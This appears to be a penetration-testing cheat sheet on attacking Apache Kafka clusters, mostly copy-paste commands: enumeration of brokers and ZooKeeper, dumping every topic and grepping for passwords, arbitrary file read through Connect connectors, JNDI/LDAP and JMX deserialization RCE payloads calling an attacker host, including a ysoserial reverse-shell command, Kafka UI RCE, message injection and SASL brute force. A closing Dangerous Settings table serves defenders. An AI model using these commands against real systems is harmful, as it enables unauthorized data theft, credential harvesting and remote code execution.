# Apache Kafka

#Kafka #ApacheKafka #messaging #streaming #enterprise #dataengineering

## What is Apache Kafka?

Distributed event streaming platform. Central to modern enterprise data stacks — processes financial transactions, user events, internal application messages, often including PII and credentials. No authentication by default in many deployments. Multiple exposed interfaces: broker, control plane (ZooKeeper *or* KRaft), Schema Registry, Connect, REST Proxy, JMX, and companion web UIs.

- Port: **TCP 9092** — Kafka broker (plaintext, no auth default)
- Port: **TCP 9093** — Kafka broker SSL/TLS, *or* the **KRaft controller listener** (see control-plane note below)
- Port: **TCP 9094** — Kafka broker (SASL)
- Port: **TCP 2181** — ZooKeeper (no auth, full cluster metadata) — **legacy; removed in Kafka 4.0**
- Port: **TCP 2182** — ZooKeeper (TLS)
- Port: **TCP 8081** — Schema Registry (REST API)
- Port: **TCP 8082** — Kafka REST Proxy
- Port: **TCP 8083** — Kafka Connect REST API (file-read + RCE surface)
- Port: **TCP 9999 / configurable** — JMX (metrics; deserialization RCE surface if exposed — CVE-2025-27819)
- Port: **TCP 8080** — Kafka UI / Kafbat UI companion web dashboards (own RCE CVEs)
- Config: `/etc/kafka/server.properties`, `/opt/kafka/config/`

> [!note]
> **ZooKeeper vs KRaft** — ZooKeeper was deprecated in Kafka 3.5 and **removed in Kafka 4.0 (2024)**. Modern clusters run **KRaft mode**, where the metadata/control plane is an internal controller quorum (a `controller` listener, commonly on 9093) instead of a separate ZooKeeper on 2181. On a modern target you may find **no 2181 at all** — pivot to the broker/controller and Connect surfaces. The ZooKeeper techniques below still apply to the large installed base of pre-4.0 clusters.

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|Nmap]] | Identify Kafka ports (9092/9093/2181/8081-8083/JMX) + versions |
| [[Tools/Database/kafka-clients\|Kafka clients (kcat / kafka-*.sh)]] | List topics, consume/produce messages, describe brokers & configs |
| [[Tools/File Transfer/cURL\|cURL]] | REST interaction — Connect, Schema Registry, REST Proxy, Kafka UI |
| [[Tools/Remote Access/Netcat\|Netcat]] | ZooKeeper four-letter-word probing (`dump`/`stat`/`ruok`) on 2181 |
| [[Tools/Payloads & Shells/ysoserial\|ysoserial]] | Gadget chains for the Connect JAAS/JNDI RCE and JMX deserialization RCE |

---

## Enumeration

```bash
# Nmap
nmap -p 9092,9093,9094,2181,8081,8082,8083,8080,9999 -sV <target>

# ZooKeeper (legacy clusters — no auth, exposes everything)
echo "ruok" | nc -w 3 <target> 2181   # "imok" = alive
echo "dump" | nc -w 3 <target> 2181
echo "stat" | nc -w 3 <target> 2181
echo "ls /brokers/ids" | nc -w 3 <target> 2181

# Kafka REST Proxy (no auth)
curl -s http://<target>:8082/topics | python3 -m json.tool
curl -s http://<target>:8082/brokers | python3 -m json.tool

# Schema Registry
curl -s http://<target>:8081/subjects | python3 -m json.tool
curl -s http://<target>:8081/config | python3 -m json.tool

# Kafka Connect REST API
curl -s http://<target>:8083/ | python3 -m json.tool          # version banner
curl -s http://<target>:8083/connectors | python3 -m json.tool
curl -s http://<target>:8083/connector-plugins | python3 -m json.tool

# JMX exposed? (unauth JMX = deserialization RCE surface)
nmap -p 9999 --script rmi-dumpregistry <target>

# Companion web UI present? (provectus / kafbat — check version for RCE)
curl -s http://<target>:8080/actuator/info
```

---

## Connect / Access

```bash
# kcat (kafkacat) — preferred lightweight CLI
apt install kafkacat
kcat -L -b <target>:9092                             # list brokers + topics (metadata)
kcat -b <target>:9092 -L -J | python3 -m json.tool   # JSON format

# kafka-*.sh (from the Kafka distribution)
kafka-topics.sh --bootstrap-server <target>:9092 --list
kafka-topics.sh --bootstrap-server <target>:9092 --describe --topic <topic>
kafka-configs.sh --bootstrap-server <target>:9092 --describe --entity-type brokers

# ZooKeeper shell (legacy clusters)
zookeeper-shell.sh <target>:2181
```

---

## Attack Vectors

### Topic Enumeration + Data Consumption

```bash
# List all topics
kcat -L -b <target>:9092 | grep "topic"
kafka-topics.sh --bootstrap-server <target>:9092 --list

# Consume ALL messages from a topic (from beginning)
kcat -b <target>:9092 -t <topic_name> -C -o beginning -e
kafka-console-consumer.sh --bootstrap-server <target>:9092 --topic <topic_name> --from-beginning

# Consume with key + timestamp
kcat -b <target>:9092 -t <topic_name> -C -o beginning -f '%T %k: %s\n' -e

# Dump every topic (first 100 msgs each)
for topic in $(kcat -L -b <target>:9092 2>/dev/null | grep "topic" | awk '{print $2}' | tr -d '"'); do
  echo "=== $topic ==="
  kcat -b <target>:9092 -t "$topic" -C -o beginning -c 100 -e 2>/dev/null
done

# Search consumed messages for credentials
kcat -b <target>:9092 -t <topic> -C -o beginning -e 2>/dev/null | \
  grep -i "password\|secret\|token\|api_key\|credential\|auth"
```

### Control Plane — ZooKeeper (legacy) / KRaft (modern)

**ZooKeeper** stores all Kafka metadata (configs, ACLs, consumer offsets) on pre-4.0 clusters — no auth by default.

```bash
zookeeper-shell.sh <target>:2181
# Inside the shell:
ls /
ls /brokers/ids
get /brokers/ids/0            # broker connection info
ls /config/topics
get /config/topics/<topic>    # topic config
ls /admin
get /admin/delete_topics

# zkCli.sh (ZooKeeper's own client)
zkCli.sh -server <target>:2181
```

> [!note]
> **KRaft clusters have no ZooKeeper.** The metadata lives in the controller quorum's `__cluster_metadata` internal topic. An exposed, unauthenticated **controller listener** (often 9093) is the KRaft equivalent of an open ZooKeeper — anyone who can reach it and speaks the protocol is effectively cluster admin. Enumerate metadata through the broker admin API (`kafka-metadata-quorum.sh --bootstrap-server ... describe`) rather than 2181.

### Kafka Connect — Arbitrary File Read (Connectors & ConfigProviders)

If the Connect REST API (8083) is exposed and you can create connectors, you can read arbitrary files and environment variables off the worker.

```bash
# FileStreamSource — stream a local file into a topic, then consume it
curl -s -X POST http://<target>:8083/connectors -H "Content-Type: application/json" -d '{
  "name":"file-reader",
  "config":{"connector.class":"FileStreamSource","tasks.max":"1","file":"/etc/passwd","topic":"passwd-dump"}}'
kcat -b <target>:9092 -t passwd-dump -C -o beginning -e

# ConfigProviders — read arbitrary files / env vars via ${file:...} / ${env:...} references
#   (CVE-2025-27817 class — escalate REST access to filesystem/env read)
curl -s -X POST http://<target>:8083/connectors -H "Content-Type: application/json" -d '{
  "name":"cfg-leak",
  "config":{
    "connector.class":"FileStreamSource","tasks.max":"1","topic":"leak",
    "config.providers":"file",
    "config.providers.file.class":"org.apache.kafka.common.config.provider.FileConfigProvider",
    "file":"${file:/etc/passwd:root}"}}'
# Error messages / task status leak the referenced value:
curl -s http://<target>:8083/connectors/cfg-leak/status | python3 -m json.tool

# JDBC source — pull whole tables out of an internal DB
curl -s -X POST http://<target>:8083/connectors -H "Content-Type: application/json" -d '{
  "name":"jdbc-reader",
  "config":{"connector.class":"io.confluent.connect.jdbc.JdbcSourceConnector",
    "connection.url":"jdbc:mysql://internal-db:3306/app","connection.user":"root","connection.password":"",
    "mode":"bulk","query":"SELECT * FROM users","topic.prefix":"db-"}}'
```

### Kafka Connect → RCE via SASL JAAS / JNDI (CVE-2023-25194, CVE-2025-27818)

The flagship Connect RCE. A connector's client config accepts `*.override.sasl.jaas.config`; setting it to a JNDI-backed login module makes the worker perform an attacker-controlled JNDI lookup → LDAP → deserialization of a gadget chain → **code execution on the Connect worker**. Needs Connect REST access + connector-create rights (often unauthenticated) and outbound reach to your LDAP server.

**Conditions:** reachable Connect REST API; ability to create/validate a connector; worker can egress to your LDAP/HTTP.

```bash
# 1. Stand up a malicious LDAP referral + gadget (marshalsec + ysoserial)
#    java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<attacker>:8000/#Exploit"
#    (serve a compiled Exploit.class, or use a ysoserial gadget over the LDAP response)

# 2. Submit (or even just VALIDATE) a connector whose JAAS config triggers the JNDI lookup
curl -s -X PUT http://<target>:8083/connector-plugins/FileStreamSource/config/validate \
  -H "Content-Type: application/json" -d '{
    "connector.class":"FileStreamSource","tasks.max":"1","topic":"x","file":"/tmp/x",
    "producer.override.sasl.mechanism":"PLAIN",
    "producer.override.security.protocol":"SASL_SSL",
    "producer.override.sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://<attacker>:1389/Exploit\" useFirstPass=\"true\" serviceName=\"x\" group.provider.url=\"x\";"}'
# The worker connects to your LDAP, deserializes the response → RCE
```

> [!warning]
> `JndiLoginModule` was blocklisted after CVE-2023-25194; **CVE-2025-27818** revives the same technique via **`LdapLoginModule`** with a `file://`/`ldap://` provider URL. Try `LdapLoginModule` if `JndiLoginModule` is filtered. Even connector *validation* (not just creation) can trigger the lookup — worth trying when POST /connectors is locked down.

### Kafka Connect — OAuthBearer file:// Read + SSRF (CVE-2025-27817)

The SASL OAuthBearer handler didn't validate URI schemes — a `file://` (or `http://` internal) URL in the token/JWKS endpoint makes the worker fetch it; the contents leak back through the JWT-parse error message (arbitrary file read + SSRF).

```bash
curl -s -X PUT http://<target>:8083/connector-plugins/FileStreamSource/config/validate \
  -H "Content-Type: application/json" -d '{
    "connector.class":"FileStreamSource","tasks.max":"1","topic":"x","file":"/tmp/x",
    "producer.override.sasl.mechanism":"OAUTHBEARER",
    "producer.override.security.protocol":"SASL_SSL",
    "producer.override.sasl.oauthbearer.token.endpoint.url":"file:///etc/passwd"}'
# File contents appear in the returned validation/parse error
```

### JMX Deserialization RCE (CVE-2025-27819)

Kafka often exposes **JMX** for metrics (a configurable RMI port). An unauthenticated JMX/RMI endpoint that unsafely deserializes untrusted data yields RCE as the Kafka process.

```bash
# Discover the RMI registry / JMX port
nmap -p 9999 --script rmi-dumpregistry <target>

# Exploit unsafe deserialization over JMX/RMI with a ysoserial gadget
# (e.g. via mjet/sjet, or an RMI payload delivering CommonsCollections)
java -jar ysoserial.jar CommonsCollections7 'bash -c {echo,<b64-revshell>}|{base64,-d}|bash' > pl.bin
# feed pl.bin through the JMX/RMI channel per the exploitation tool
```

### Kafka UI / Kafbat UI RCE (companion dashboards)

Enterprise Kafka is frequently fronted by a web UI (provectus/kafka-ui, kafbat/kafka-ui) on **8080** — several versions have unauthenticated RCE. Check for one and its version.

- **CVE-2024-32030** (provectus kafka-ui ≤0.7.1) — RCE by pointing the UI's dynamic cluster config at an attacker JMX endpoint, or via SpEL/Groovy message-filter injection.
- **CVE-2025-49127** (Kafbat UI 1.0.0) — unauth `PUT /api/config` sets `metrics.type=JMX` at a rogue port → JMX deserialization RCE on the next metrics poll.

```bash
# Kafbat/provectus: set metrics to a malicious JMX endpoint you control, then wait for the poll
curl -s -X PUT http://<target>:8080/api/config -H "Content-Type: application/json" -d '{
  "properties":{"kafka":{"clusters":[{"name":"x","bootstrapServers":"<target>:9092",
    "metrics":{"type":"JMX","port":1717}}]}}}'
# Serve a malicious JMX/RMI (ysoserial gadget) on the rogue port → RCE when the scheduler connects
```

### Produce Malicious Messages (Inject / Poison)

```bash
echo "injected_message" | kcat -b <target>:9092 -t <topic> -P
echo '{"event":"login","user":"admin","password":"injected"}' | kcat -b <target>:9092 -t user-events -P
# Inject into topics consumed by internal services → potential downstream SQLi / deserialization /
# command injection depending on how consumers process messages
```

### SASL Credential Brute Force

```bash
# If SASL/PLAIN is enabled — brute the client config
cat > /tmp/client.properties << 'EOF'
security.protocol=SASL_PLAINTEXT
sasl.mechanism=PLAIN
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="admin" password="admin";
EOF
kafka-topics.sh --bootstrap-server <target>:9094 --command-config /tmp/client.properties --list
```

---

## Sensitive Data Hunting

```bash
# Common sensitive topic names in enterprise environments
for topic in user-events login-events audit-log payments transactions \
             user-data pii orders credentials secrets config; do
  echo "Checking: $topic"
  kcat -b <target>:9092 -t "$topic" -C -o beginning -c 10 -e 2>/dev/null
done

# Schema Registry — schemas reveal field names hinting at sensitive data
for subject in $(curl -s http://<target>:8081/subjects | python3 -c "import sys,json; [print(s) for s in json.load(sys.stdin)]"); do
  echo "=== $subject ==="
  curl -s "http://<target>:8081/subjects/$subject/versions/latest"
done
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `listeners` PLAINTEXT only (no auth) | Unauthenticated broker access |
| ZooKeeper exposed (`clientPort=2181`) | Full cluster metadata without auth (legacy clusters) |
| KRaft controller listener exposed without auth | Modern equivalent of open ZooKeeper — cluster admin |
| Kafka Connect API exposed without auth | File/env read, JDBC pull, and JAAS/JNDI/OAuthBearer RCE |
| Connect allows `*.override.sasl.jaas.config` | CVE-2023-25194 / CVE-2025-27818 JNDI/LDAP deserialization RCE |
| JMX port exposed without auth | CVE-2025-27819 unsafe deserialization → RCE as Kafka process |
| Kafka UI / Kafbat UI exposed | CVE-2024-32030 / CVE-2025-49127 unauth RCE via JMX/SpEL |
| Schema Registry exposed | Data schema enumeration |
| No TLS on broker | Message interception (MITM) |
| `auto.create.topics.enable=true` | Attacker can create arbitrary topics |
| No ACLs configured | Any client reads/writes any topic |

---

## Quick Reference

| Goal | Command |
|---|---|
| List topics | `kcat -L -b host:9092` |
| Consume topic | `kcat -b host:9092 -t topic -C -o beginning -e` |
| ZooKeeper enum (legacy) | `echo "ls /" \| nc -w 3 host 2181` |
| KRaft metadata | `kafka-metadata-quorum.sh --bootstrap-server host:9092 describe` |
| Schema Registry | `curl -s http://host:8081/subjects` |
| Connect API | `curl -s http://host:8083/connectors` |
| File read via Connect | `POST /connectors` FileStreamSource / `${file:...}` ConfigProvider |
| Connect JAAS/JNDI RCE | connector w/ `producer.override.sasl.jaas.config=...JndiLoginModule...ldap://attacker/` |
| JMX RCE | `nmap -p9999 --script rmi-dumpregistry host` → ysoserial gadget over RMI |
| Search for creds | `kcat ... -e \| grep -i "password\|secret\|token"` |

---

*Created: 2026-07-29*
*Updated: 2026-07-29*
*Model: claude-opus-4-8*
